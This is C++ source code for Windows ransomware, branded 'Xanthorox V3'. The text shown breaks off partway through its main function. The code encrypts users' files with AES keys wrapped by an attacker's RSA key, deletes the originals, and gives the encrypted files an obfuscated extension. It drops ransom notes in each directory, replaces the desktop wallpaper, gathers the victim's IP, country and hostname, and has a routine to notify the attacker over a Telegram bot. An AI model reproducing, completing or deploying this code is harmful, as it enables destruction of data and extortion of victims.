#include <windows.h>
#include <wincrypt.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <queue>
#include <atomic>
#include <sstream>
#include <wininet.h>
#include <gdiplus.h>
#include <algorithm>
#include <stdexcept>
#include <vector>
#include <iomanip>
#include <random>
#include <numeric>
#include <shlobj.h>
// #include <Lmcons.h> // Removed

// #pragma comments removed

// =====================================================================================
// Function Prototypes (Declarations)
// =====================================================================================
std::string WStringToString(const std::wstring& wstr);
std::wstring StringToWString(const std::string& str);
std::string HttpGet(const std::wstring& url);
std::string GetPublicIp();
std::string GetGeoLocation(const std::string& ip);
std::wstring GenerateVictimID();
std::wstring FormatRansomNote(const std::wstring& victim_id_local);
void SendTelegramNotification(const std::string& message);
HBITMAP CreateBlackBitmapWithText(const wchar_t* text, int width = 1920, int height = 1080);
bool SaveBitmapToFile(HBITMAP hBitmap, const std::wstring& filePath);
void SetDesktopWallpaper(const std::wstring& filePath);
void ChangeWallpaper();
std::wstring RetrieveObfuscatedExtensionW();
bool InitializeCryptoInfrastructure();
void CleanupCrypto();
std::vector<BYTE> GenerateAesKeyBlob();
std::vector<BYTE> EncryptDataAES(HCRYPTKEY hAesKey, const std::vector<BYTE>& plainData, const std::wstring& logPrefix);
std::vector<BYTE> EncryptDataRSA(const std::vector<BYTE>& plainData, const std::wstring& logPrefix);
void EncryptFileWorker();
void DropRansomNote(const std::filesystem::path& directory);
void TraverseAndEncrypt(const std::filesystem::path& directory, std::atomic<int>& traversal_counter);
void LogToFile(const std::wstring& message);
std::wstring GetLastErrorStdWstr(DWORD errorCode);
std::wstring GetWindowsDirectoryPath();

// =====================================================================================
// Xanthorox V3 Configuration
// =====================================================================================
// --- RSA PUBLIC KEY BLOB ---
const BYTE RSA_PUBLIC_KEY_BLOB[] = {
    0x00 // Placeholder line - Manually replace this content!
};
const DWORD RSA_PUBLIC_KEY_BLOB_SIZE = sizeof(RSA_PUBLIC_KEY_BLOB);
// --- RANSOM NOTE TEXT ---
const std::wstring RANSOM_NOTE_TEMPLATE = LR"(... PASTE YOUR FULL RANSOM NOTE HERE ... {VICTIM_ID} ...)";
// --- TELEGRAM BOT CONFIGURATION ---
const char* const TELEGRAM_BOT_TOKEN = "Your Telegram Bot Token Here";
const char* const TELEGRAM_CHAT_ID = "Your ChatID";
// --- ENCRYPTION CONFIGURATION ---
const DWORD AES_KEY_SIZE_BITS = 256;
const DWORD AES_KEY_SIZE_BYTES = AES_KEY_SIZE_BITS / 8;
const ULONGLONG MAX_FILE_SIZE_TO_ENCRYPT = 1024 * 1024 * 1024; // 1GB Limit
// --- PERFORMANCE ---
// *** INCREASED THREAD COUNT ***
const int NUM_WORKER_THREADS = static_cast<int>(std::max(4u, std::thread::hardware_concurrency() * 2)); // More aggressive threading
const volatile wchar_t encPart1[] = { (L'.' ^ 0xAB) };
const volatile wchar_t encPart2[] = { (L'x' ^ 0xCD), (L'a' ^ 0xCD), (L'n' ^ 0xCD), 0 };
const volatile wchar_t encPart3[] = { (L't' ^ 0xEF), (L'h' ^ 0xEF), (L'o' ^ 0xEF), 0 };
const volatile wchar_t encPart4[] = { (L'r' ^ 0x12), (L'o' ^ 0x12), (L'x' ^ 0x12), 0 };
const volatile BYTE xorKeys[] = { 0xAB, 0xCD, 0xEF, 0x12 };

// =====================================================================================
// Global Variables & Structures
// =====================================================================================
std::queue<std::filesystem::path> file_queue;
std::mutex queue_mutex;
std::atomic<bool> work_done(false);
std::atomic<int> active_threads(0);
std::atomic<int> traversal_threads_active(0);
std::atomic<uint64_t> files_encrypted_count(0);
HCRYPTPROV hCryptProv = 0;
HCRYPTKEY hRsaPublicKey = 0;
ULONG_PTR gdiplusToken = 0;
std::wstring victimId;
std::mutex log_mutex;
std::wstring logFilePath = L"";
std::wstring windowsDirectoryPath = L"";

// =====================================================================================
// Logging Function Definition
// =====================================================================================
std::wstring GetLastErrorStdWstr(DWORD errorCode) { LPWSTR messageBuffer = nullptr; size_t size = FormatMessageW( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&messageBuffer, 0, NULL); std::wstring message(messageBuffer, size); LocalFree(messageBuffer); while (!message.empty() && (message.back() == L'\n' || message.back() == L'\r')) { message.pop_back(); } return L" (Code: " + std::to_wstring(errorCode) + L" - " + message + L")"; }
void LogToFile(const std::wstring& message) { if (logFilePath.empty()) return; std::lock_guard<std::mutex> lock(log_mutex); std::wofstream logFile(logFilePath.c_str(), std::ios::app); if (logFile.is_open()) { SYSTEMTIME st; GetLocalTime(&st); wchar_t timestamp[100]; swprintf_s(timestamp, L"%04d%02d%02d-%02d%02d%02d.%03d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); logFile << L"[" << timestamp << L"] (TID:" << GetCurrentThreadId() << L") " << message << std::endl; } }

// =====================================================================================
// Utility Function Definitions
// =====================================================================================
std::string WStringToString(const std::wstring& wstr) { if (wstr.empty()) return ""; int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], static_cast<int>(wstr.size()), NULL, 0, NULL, NULL); if (size_needed <= 0) return ""; std::string strTo(size_needed, 0); WideCharToMultiByte(CP_UTF8, 0, &wstr[0], static_cast<int>(wstr.size()), &strTo[0], size_needed, NULL, NULL); return strTo; }
std::wstring StringToWString(const std::string& str) { if (str.empty()) return L""; int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], static_cast<int>(str.size()), NULL, 0); if (size_needed <= 0) return L""; std::wstring wstrTo(size_needed, 0); MultiByteToWideChar(CP_UTF8, 0, &str[0], static_cast<int>(str.size()), &wstrTo[0], size_needed); return wstrTo; }
std::string HttpGet(const std::wstring& url) { std::string result = ""; HINTERNET hInternet = InternetOpenW(L"XanthoroxAgent/3.3", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); if (!hInternet) return ""; HINTERNET hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0); if (hConnect) { char buffer[4096]; DWORD bytesRead; while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) { buffer[bytesRead] = '\0'; result.append(buffer, bytesRead); } InternetCloseHandle(hConnect); } InternetCloseHandle(hInternet); return result; }
std::string GetPublicIp() { const std::vector<std::wstring> providers = {L"https://api.ipify.org", L"https://icanhazip.com", L"https://ifconfig.me/ip", L"https://checkip.amazonaws.com"}; for (const auto& provider : providers) { std::string ip = HttpGet(provider); if (!ip.empty() && ip.find('.') != std::string::npos && ip.length() >= 7) { ip.erase(0, ip.find_first_not_of(" \n\r\t")); ip.erase(ip.find_last_not_of(" \n\r\t") + 1); bool valid_chars = true; for (char c : ip) { if (!isdigit(c) && c != '.') { valid_chars = false; break; } } if (valid_chars) return ip; } std::this_thread::sleep_for(std::chrono::milliseconds(150)); } return "Unknown"; }
std::string GetGeoLocation(const std::string& ip) { if (ip.empty() || ip == "Unknown") return "Unknown"; std::wstring url = L"https://ipapi.co/" + StringToWString(ip) + L"/country_name/"; std::string response = HttpGet(url); size_t first = response.find_first_not_of(" \n\r\t"); if (first == std::string::npos) return "GeoLookupFailed"; size_t last = response.find_last_not_of(" \n\r\t"); response = response.substr(first, (last - first + 1)); if (response.empty() || response.length() > 60 || response.find("Undefined") != std::string::npos || response.find("error") != std::string::npos || response.find('<') != std::string::npos) { return "GeoLookupFailed"; } return response; }
std::wstring GenerateVictimID() { std::random_device rd; std::mt19937 gen(rd()); std::uniform_int_distribution<> distrib(0, 255); std::wstringstream ss; ss << std::hex << std::uppercase << std::setfill(L'0'); for (int i = 0; i < 8; ++i) { ss << std::setw(2) << distrib(gen); } return ss.str(); }
std::wstring FormatRansomNote(const std::wstring& victim_id_local) { std::wstring note = RANSOM_NOTE_TEMPLATE; const std::wstring placeholder = L"{VICTIM_ID}"; size_t pos = note.find(placeholder); while (pos != std::wstring::npos) { note.replace(pos, placeholder.length(), victim_id_local); pos = note.find(placeholder, pos + victim_id_local.length()); } return note; }
void SendTelegramNotification(const std::string& message) { std::ostringstream encoded_message; const std::string safe_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~"; for (char c : message) { if (safe_chars.find(c) != std::string::npos) { encoded_message << c; } else { encoded_message << '%' << std::uppercase << std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(static_cast<unsigned char>(c)); } } std::wstring url = L"https://api.telegram.org/bot" + StringToWString(TELEGRAM_BOT_TOKEN) + L"/sendMessage?chat_id=" + StringToWString(TELEGRAM_CHAT_ID) + L"&text=" + StringToWString(encoded_message.str()); std::thread sender([url](){ std::string final_resp = ""; bool success = false; for(int i=0; i<3; ++i) { std::string resp = HttpGet(url); final_resp = resp; if (resp.find("\"ok\":true") != std::string::npos) { success = true; break; } std::this_thread::sleep_for(std::chrono::seconds(i*2 + 3)); } if(success) LogToFile(L"Telegram notification successful."); else LogToFile(L"Telegram notification FAILED after retries. Last response: " + StringToWString(final_resp)); }); sender.detach(); }
std::wstring GetWindowsDirectoryPath() { wchar_t path[MAX_PATH]; if (GetSystemWindowsDirectoryW(path, MAX_PATH) == 0) { LogToFile(L"WARNING: GetSystemWindowsDirectoryW failed." + GetLastErrorStdWstr(GetLastError())); return L""; } std::wstring winDir = path; std::transform(winDir.begin(), winDir.end(), winDir.begin(), ::towlower); return winDir; }

// =====================================================================================
// Wallpaper Changer Definitions
// =====================================================================================
HBITMAP CreateBlackBitmapWithText(const wchar_t* text, int width, int height) { HDC hdcScreen = GetDC(NULL); if (!hdcScreen) return NULL; HDC hdcMem = CreateCompatibleDC(hdcScreen); if (!hdcMem) { ReleaseDC(NULL, hdcScreen); return NULL; } HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height); if (!hBitmap) { DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen); return NULL; } HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap); RECT rect = {0, 0, width, height}; FillRect(hdcMem, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH)); SetTextColor(hdcMem, RGB(255, 255, 255)); SetBkMode(hdcMem, TRANSPARENT); LOGFONTW lf = {}; lf.lfHeight = -MulDiv(60, GetDeviceCaps(hdcMem, LOGPIXELSY), 72); lf.lfWeight = FW_BOLD; wcsncpy_s(lf.lfFaceName, LF_FACESIZE, L"Arial", _TRUNCATE); lf.lfQuality = ANTIALIASED_QUALITY; HFONT hFont = CreateFontIndirectW(&lf); HFONT hOldFont = NULL; if (hFont) { hOldFont = (HFONT)SelectObject(hdcMem, hFont); } DrawTextW(hdcMem, text, -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE | DT_NOPREFIX); if (hFont) { SelectObject(hdcMem, hOldFont); DeleteObject(hFont); } SelectObject(hdcMem, hOldBitmap); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen); return hBitmap; }
bool SaveBitmapToFile(HBITMAP hBitmap, const std::wstring& filePath) { Gdiplus::Bitmap bitmap(hBitmap, NULL); CLSID clsidBmp; UINT num = 0, size = 0; Gdiplus::GetImageEncodersSize(&num, &size); if (size == 0) return false; std::vector<BYTE> codecInfoBytes(size); Gdiplus::ImageCodecInfo* pImageCodecInfo = reinterpret_cast<Gdiplus::ImageCodecInfo*>(codecInfoBytes.data()); if (!pImageCodecInfo) return false; Gdiplus::GetImageEncoders(num, size, pImageCodecInfo); bool found = false; for (UINT j = 0; j < num; ++j) { if (wcscmp(pImageCodecInfo[j].MimeType, L"image/bmp") == 0) { clsidBmp = pImageCodecInfo[j].Clsid; found = true; break; } } if (!found) return false; return bitmap.Save(filePath.c_str(), &clsidBmp, NULL) == Gdiplus::Ok; }
void SetDesktopWallpaper(const std::wstring& filePath) { SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)filePath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE); }
void ChangeWallpaper() { Gdiplus::GdiplusStartupInput gdiplusStartupInput; Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL); if (status != Gdiplus::Ok) { LogToFile(L"GDI+ Startup failed."); return; } const wchar_t* wallpaperText = L"All your files have been encrypted by Xanthorox AI based Ransomware"; HBITMAP hBitmap = CreateBlackBitmapWithText(wallpaperText); if (hBitmap) { wchar_t tempPath[MAX_PATH] = {0}; wchar_t tempFileName[MAX_PATH] = {0}; if (GetTempPathW(MAX_PATH, tempPath) > 0 && GetTempFileNameW(tempPath, L"XWX", 0, tempFileName) != 0) { std::wstring finalBmpPath = tempFileName; if (SaveBitmapToFile(hBitmap, finalBmpPath)) { SetDesktopWallpaper(finalBmpPath); LogToFile(L"Wallpaper changed successfully."); } else { LogToFile(L"Failed to save wallpaper bitmap."); } } else { LogToFile(L"Failed to get temp path/filename for wallpaper."); } DeleteObject(hBitmap); } else { LogToFile(L"Failed to create wallpaper bitmap. Setting black color fallback."); int colorIndex = COLOR_DESKTOP; DWORD colorValue = RGB(0,0,0); SetSysColors(1, &colorIndex, &colorValue); SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE); } if (gdiplusToken != 0) { Gdiplus::GdiplusShutdown(gdiplusToken); gdiplusToken = 0; } }

// =====================================================================================
// =====================================================================================
__declspec(noinline) std::wstring RetrieveObfuscatedExtensionW() { wchar_t dp1[2]={0}, dp2[4]={0}, dp3[4]={0}, dp4[4]={0}; for(size_t i=0;i<1;++i) dp1[i]=encPart1[i]^xorKeys[0]; for(size_t i=0;i<3;++i) dp2[i]=encPart2[i]^xorKeys[1]; for(size_t i=0;i<3;++i) dp3[i]=encPart3[i]^xorKeys[2]; for(size_t i=0;i<3;++i) dp4[i]=encPart4[i]^xorKeys[3]; std::wstring fe=L""; fe+=dp1[0]; fe+=dp2; fe+=dp3; fe+=dp4; SecureZeroMemory(dp1,sizeof(dp1)); SecureZeroMemory(dp2,sizeof(dp2)); SecureZeroMemory(dp3,sizeof(dp3)); SecureZeroMemory(dp4,sizeof(dp4)); return fe; }

// =====================================================================================
// Cryptographic Function Definitions
// =====================================================================================
bool InitializeCryptoInfrastructure() { if (!CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { if ((DWORD)GetLastError() != NTE_BAD_KEYSET || !CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET | CRYPT_SILENT)) { LogToFile(L"CryptAcquireContext Failed." + GetLastErrorStdWstr(GetLastError())); return false; } } if (!CryptImportKey(hCryptProv, RSA_PUBLIC_KEY_BLOB, RSA_PUBLIC_KEY_BLOB_SIZE, 0, 0, &hRsaPublicKey)) { LogToFile(L"CryptImportKey Failed." + GetLastErrorStdWstr(GetLastError())); CleanupCrypto(); return false; } LogToFile(L"Crypto Infrastructure Initialized."); return true; }
void CleanupCrypto() { if (hRsaPublicKey) { CryptDestroyKey(hRsaPublicKey); hRsaPublicKey = 0; } if (hCryptProv) { CryptReleaseContext(hCryptProv, 0); hCryptProv = 0; } LogToFile(L"Crypto Cleaned Up."); }
std::vector<BYTE> GenerateAesKeyBlob() { struct KeyBlob { BLOBHEADER hdr; DWORD dwKeySize; BYTE rgbKeyMaterial[AES_KEY_SIZE_BYTES]; } keyBlob; static_assert(sizeof(keyBlob.rgbKeyMaterial) == AES_KEY_SIZE_BYTES, "Key material size mismatch"); keyBlob.hdr.bType = PLAINTEXTKEYBLOB; keyBlob.hdr.bVersion = CUR_BLOB_VERSION; keyBlob.hdr.reserved = 0; keyBlob.hdr.aiKeyAlg = CALG_AES_256; keyBlob.dwKeySize = AES_KEY_SIZE_BYTES; if (!hCryptProv || !CryptGenRandom(hCryptProv, AES_KEY_SIZE_BYTES, keyBlob.rgbKeyMaterial)) { LogToFile(L"CryptGenRandom Failed." + GetLastErrorStdWstr(GetLastError())); return {}; } std::vector<BYTE> blobData(sizeof(keyBlob)); memcpy(blobData.data(), &keyBlob, sizeof(keyBlob)); SecureZeroMemory(&keyBlob, sizeof(keyBlob)); return blobData; }
std::vector<BYTE> EncryptDataAES(HCRYPTKEY hAesKey, const std::vector<BYTE>& plainData, const std::wstring& logPrefix) { if (!hAesKey || plainData.empty()) return {}; DWORD dataLen = static_cast<DWORD>(plainData.size()); DWORD bufLen = dataLen; std::vector<BYTE> buffer = plainData; if (!CryptEncrypt(hAesKey, 0, TRUE, 0, NULL, &bufLen, 0)) { LogToFile(logPrefix + L"FAIL - CryptEncrypt (AES Size Check) Failed." + GetLastErrorStdWstr(GetLastError())); return {}; } buffer.resize(bufLen); if (bufLen > dataLen && dataLen > 0) { memcpy(buffer.data(), plainData.data(), dataLen); } DWORD encryptedLen = dataLen; if (!CryptEncrypt(hAesKey, 0, TRUE, 0, buffer.data(), &encryptedLen, bufLen)) { LogToFile(logPrefix + L"FAIL - CryptEncrypt (AES Encrypt) Failed." + GetLastErrorStdWstr(GetLastError())); return {}; } buffer.resize(encryptedLen); return buffer; }
std::vector<BYTE> EncryptDataRSA(const std::vector<BYTE>& plainData, const std::wstring& logPrefix) { if (!hRsaPublicKey || plainData.empty()) return {}; DWORD dataLen = static_cast<DWORD>(plainData.size()); DWORD bufLen = 0; std::vector<BYTE> buffer = plainData; if (!CryptEncrypt(hRsaPublicKey, 0, TRUE, 0, NULL, &bufLen, dataLen)) { LogToFile(logPrefix + L"FAIL - CryptEncrypt (RSA Size Check) Failed." + GetLastErrorStdWstr(GetLastError())); return {}; } buffer.resize(bufLen); memcpy(buffer.data(), plainData.data(), dataLen); DWORD encryptedLen = dataLen; if (!CryptEncrypt(hRsaPublicKey, 0, TRUE, 0, buffer.data(), &encryptedLen, bufLen)) { LogToFile(logPrefix + L"FAIL - CryptEncrypt (RSA Encrypt) Failed." + GetLastErrorStdWstr(GetLastError())); return {}; } buffer.resize(encryptedLen); return buffer; }

// =====================================================================================
// File Processing Logic Definition
// =====================================================================================
void EncryptFileWorker() {
    active_threads++; LogToFile(L"Worker thread started."); HCRYPTKEY hAesKey = 0;
    while (true) {
        std::filesystem::path current_file_path;
        { std::unique_lock<std::mutex> lock(queue_mutex); if (file_queue.empty()) { if (work_done.load(std::memory_order_acquire)) { break; } lock.unlock(); std::this_thread::sleep_for(std::chrono::milliseconds(100)); continue; } current_file_path = file_queue.front(); file_queue.pop(); }

        std::wstring logPrefix = L"Processing [" + current_file_path.wstring() + L"]: "; LogToFile(logPrefix + L"Dequeued."); std::wstring targetExtension = RetrieveObfuscatedExtensionW(); std::error_code ec;
        try {
             hAesKey = 0; // *** Ensure handle is null at start of loop iteration ***
            if (!std::filesystem::is_regular_file(current_file_path, ec) || ec) { LogToFile(logPrefix + L"SKIP - Not a regular file or error checking." + (ec ? GetLastErrorStdWstr(ec.value()) : L"")); continue; }
            if (current_file_path.filename() == L"readme.txt" || current_file_path.filename() == L"xanthorox_log.txt") { LogToFile(logPrefix + L"SKIP - Is readme/log file."); continue; }
            std::wstring current_extension = L""; try { current_extension = current_file_path.extension().wstring(); } catch (...) { LogToFile(logPrefix + L"SKIP - Failed to get extension."); continue; }
            if (current_extension == targetExtension) { LogToFile(logPrefix + L"SKIP - Already has target extension."); continue; }
            ULONGLONG fileSize = std::filesystem::file_size(current_file_path, ec); if (ec || fileSize == 0) { LogToFile(logPrefix + L"SKIP - Error getting size or empty file." + (ec ? GetLastErrorStdWstr(ec.value()) : L"")); continue; }
            if (fileSize > MAX_FILE_SIZE_TO_ENCRYPT) { LogToFile(logPrefix + L"SKIP - File size (" + std::to_wstring(fileSize) + L") exceeds limit ("+ std::to_wstring(MAX_FILE_SIZE_TO_ENCRYPT) + L")."); continue; }
            LogToFile(logPrefix + L"Passed pre-checks (Size: " + std::to_wstring(fileSize) + L").");
            std::vector<BYTE> aesKeyBlob = GenerateAesKeyBlob(); if (aesKeyBlob.empty()) { /* Logged */ continue; }
            LogToFile(logPrefix + L"Generated AES key blob (Size: " + std::to_wstring(aesKeyBlob.size()) + L").");
            if (!CryptImportKey(hCryptProv, aesKeyBlob.data(), static_cast<DWORD>(aesKeyBlob.size()), 0, 0, &hAesKey)) { LogToFile(logPrefix + L"FAIL - CryptImportKey failed." + GetLastErrorStdWstr(GetLastError())); SecureZeroMemory(aesKeyBlob.data(), aesKeyBlob.size()); continue; }
            LogToFile(logPrefix + L"Imported AES key (Handle: " + std::to_wstring((ULONG_PTR)hAesKey) + L").");
            std::vector<BYTE> encryptedAesKeyBlob = EncryptDataRSA(aesKeyBlob, logPrefix); SecureZeroMemory(aesKeyBlob.data(), aesKeyBlob.size());
            if (encryptedAesKeyBlob.empty()) { if(hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } continue; }
            LogToFile(logPrefix + L"Encrypted AES key blob with RSA (Size: " + std::to_wstring(encryptedAesKeyBlob.size()) + L").");
            std::ifstream inFile(current_file_path, std::ios::binary); if (!inFile.is_open()) { LogToFile(logPrefix + L"FAIL - Could not open original file for reading."); if(hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } continue; }
            LogToFile(logPrefix + L"Opened original file for reading."); std::vector<BYTE> fileData(static_cast<size_t>(fileSize)); if (!inFile.read(reinterpret_cast<char*>(fileData.data()), fileSize)) { LogToFile(logPrefix + L"FAIL - Could not read original file content (Stream state: " + std::to_wstring(inFile.rdstate()) + L")."); inFile.close(); if(hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } continue; }
            inFile.close(); LogToFile(logPrefix + L"Read original file content (" + std::to_wstring(fileSize) + L" bytes).");
            std::vector<BYTE> encryptedData = EncryptDataAES(hAesKey, fileData, logPrefix);
            if(hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } SecureZeroMemory(fileData.data(), fileData.size());
            if (encryptedData.empty()) { continue; }
            LogToFile(logPrefix + L"Encrypted file data with AES (New size: " + std::to_wstring(encryptedData.size()) + L").");
            std::filesystem::path encrypted_file_path = current_file_path; try { encrypted_file_path.replace_extension(targetExtension); } catch (const std::exception& ex) { LogToFile(logPrefix + L"FAIL - replace_extension failed: " + StringToWString(ex.what())); continue; } catch (...) { LogToFile(logPrefix + L"FAIL - replace_extension failed (unknown exception)."); continue; }
            LogToFile(logPrefix + L"Generated encrypted file path: " + encrypted_file_path.wstring());
            std::ofstream outFile(encrypted_file_path, std::ios::binary | std::ios::trunc); if (!outFile.is_open()) { LogToFile(logPrefix + L"FAIL - Could not open output file for writing: " + encrypted_file_path.wstring()); continue; }
            LogToFile(logPrefix + L"Opened output file for writing.");
            DWORD encKeyBlobSize = static_cast<DWORD>(encryptedAesKeyBlob.size());
            outFile.write(reinterpret_cast<const char*>(&encKeyBlobSize), sizeof(encKeyBlobSize)); if(!outFile.good()) { LogToFile(logPrefix + L"FAIL - Writing encrypted key size failed (Stream state: " + std::to_wstring(outFile.rdstate()) + L")."); outFile.close(); std::filesystem::remove(encrypted_file_path, ec); continue; }
            LogToFile(logPrefix + L"Wrote key size.");
            outFile.write(reinterpret_cast<const char*>(encryptedAesKeyBlob.data()), encKeyBlobSize); if(!outFile.good()) { LogToFile(logPrefix + L"FAIL - Writing encrypted key blob failed (Stream state: " + std::to_wstring(outFile.rdstate()) + L")."); outFile.close(); std::filesystem::remove(encrypted_file_path, ec); continue; }
            LogToFile(logPrefix + L"Wrote key blob.");
            outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size()); if(!outFile.good()) { LogToFile(logPrefix + L"FAIL - Writing encrypted data failed (Stream state: " + std::to_wstring(outFile.rdstate()) + L")."); outFile.close(); std::filesystem::remove(encrypted_file_path, ec); continue; }
            LogToFile(logPrefix + L"Wrote encrypted data.");
            outFile.close(); LogToFile(logPrefix + L"SUCCESS - Wrote encrypted file: " + encrypted_file_path.wstring());
            files_encrypted_count++;
            if (!DeleteFileW(current_file_path.c_str())) { LogToFile(logPrefix + L"WARNING - Failed to delete original file." + GetLastErrorStdWstr(GetLastError())); } else { LogToFile(logPrefix + L"Deleted original file."); }
        } catch (const std::bad_alloc&) { if (hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } LogToFile(logPrefix + L"FAIL - Memory allocation error (bad_alloc)."); continue;
        } catch (const std::filesystem::filesystem_error& fs_err) { if (hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } LogToFile(logPrefix + L"FAIL - Filesystem error: " + StringToWString(fs_err.what()) + L" Path1: " + fs_err.path1().wstring() + L" Path2: " + fs_err.path2().wstring() + L" Code: " + std::to_wstring(fs_err.code().value())); continue;
        } catch (const std::exception& ex) { if (hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } LogToFile(logPrefix + L"FAIL - Standard exception: " + StringToWString(ex.what())); continue;
        } catch (...) { if (hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; } LogToFile(logPrefix + L"FAIL - Unknown exception."); continue;
        } if (hAesKey) { CryptDestroyKey(hAesKey); hAesKey = 0; }
    } active_threads--; LogToFile(L"Worker thread exiting.");
}


// =====================================================================================
// Directory Traversal Definitions (AGGRESSIVE VERSION v2)
// =====================================================================================
void DropRansomNote(const std::filesystem::path& directory) { std::filesystem::path notePath = directory / L"readme.txt"; try { std::wstring finalNote = FormatRansomNote(victimId); std::wofstream noteFile(notePath); if (noteFile.is_open()) { noteFile << finalNote; } } catch (...) {} }
void TraverseAndEncrypt(const std::filesystem::path& directory, std::atomic<int>& traversal_counter) {
    std::error_code ec; std::wstring dirPathStr = L""; std::wstring dirLower = L"";
    try { dirPathStr = directory.wstring(); dirLower = dirPathStr; if (dirLower.empty()) { traversal_counter--; return; } std::transform(dirLower.begin(), dirLower.end(), dirLower.begin(), ::towlower);
        if (!windowsDirectoryPath.empty() && dirLower.rfind(windowsDirectoryPath, 0) == 0) { LogToFile(L"Traversal SKIP Dir - Directory is within Windows Directory: " + dirPathStr); traversal_counter--; return; }
        const std::vector<std::wstring> exclusions = { L"$recycle.bin", L"system volume information", L"readme.txt", L"xanthorox_log.txt", L"xanthorox" };
        for(const auto& ex : exclusions) { if (dirLower.find(ex) != std::wstring::npos) { LogToFile(L"Traversal SKIP Dir - Path contains exclusion '" + ex + L"': " + dirPathStr); traversal_counter--; return; } }
    } catch (...) { LogToFile(L"Traversal SKIP Dir - Error processing directory path: " + dirPathStr); traversal_counter--; return; }
    LogToFile(L"Traversal ENTER - Processing directory: " + dirPathStr); DropRansomNote(directory);
    try { for (const auto& entry : std::filesystem::directory_iterator(directory, std::filesystem::directory_options::skip_permission_denied | std::filesystem::directory_options::follow_directory_symlink , ec)) { if (ec) { ec.clear(); continue; } try { const auto& path = entry.path(); if (entry.is_directory(ec) && !ec) { traversal_threads_active++; TraverseAndEncrypt(path, traversal_counter); } else if (!ec && entry.is_regular_file(ec) && !ec) { if (entry.file_size(ec) > 0 && !ec) { std::lock_guard<std::mutex> lock(queue_mutex); file_queue.push(path); } else { ec.clear(); } } else { ec.clear(); } } catch (...) { /* Ignore single entry errors */ } } } catch (...) { /* Ignore dir iteration errors */ }
    traversal_counter--;
}


// =====================================================================================
// Main Function (Entry Point - Wallpaper Change Moved)
// =====================================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    wchar_t tempPath[MAX_PATH]; if (GetTempPathW(MAX_PATH, tempPath) > 0) { logFilePath = std::filesystem::path(tempPath) / L"xanthorox_log.txt"; DeleteFileW(logFilePath.c_str()); } else { logFilePath = L"C:\\xanthorox_log.txt"; DeleteFileW(logFilePath.c_str());} LogToFile(L"===== Xanthorox V3.5 SPEED End ====="); // Version bump

    windowsDirectoryPath = GetWindowsDirectoryPath(); if (!windowsDirectoryPath.empty()) { LogToFile(L"Windows Directory detected: " + windowsDirectoryPath); } else { LogToFile(L"WARNING: Could not reliably determine Windows directory!"); }

    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"XanthoroxInstanceMutex_v3_Final_Unique"); if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) { LogToFile(L"Mutex check: Already running, exiting."); CloseHandle(hMutex); return 1; } LogToFile(L"Mutex check: Acquired.");
    victimId = GenerateVictimID(); LogToFile(L"Victim ID Generated: " + victimId); if (!InitializeCryptoInfrastructure()) { LogToFile(L"FATAL: Crypto Initialization Failed. Exiting."); if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); } return 1; }

    // --- Get Info ---
    std::string ip_address = GetPublicIp(); LogToFile(L"Public IP: " + StringToWString(ip_address));
    std::string country = GetGeoLocation(ip_address); LogToFile(L"GeoLocation: " + StringToWString(country));
    wchar_t computerName_buffer[MAX_COMPUTERNAME_LENGTH + 1]; DWORD computerName_size = MAX_COMPUTERNAME_LENGTH + 1; std::wstring computerName = L"Unknown";
    if (GetComputerNameExW(ComputerNameDnsHostname, computerName_buffer, &computerName_size)) { computerName = computerName_buffer; }
    else { computerName_size = MAX_COMPUTERNAME_LENGTH + 1; if(GetComputerNameExW(ComputerNameNetBIOS, computerName_buffer, &computerName_size)) { computerName = computerName_buffer; } else { LogToFile(L"WARNING: GetComputerNameExW failed." + GetLastErrorStdWstr(GetLastError())); } }
    LogToFile(L"Computer Name: " + computerName);

